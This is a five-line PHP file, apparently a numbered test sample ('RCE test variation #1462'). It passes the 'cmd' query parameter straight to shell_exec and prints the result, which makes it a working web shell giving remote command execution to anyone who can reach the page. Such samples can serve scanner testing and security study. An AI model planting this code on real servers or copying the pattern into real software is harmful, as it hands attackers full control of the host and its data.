<?php
// RCE test variation #1462
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>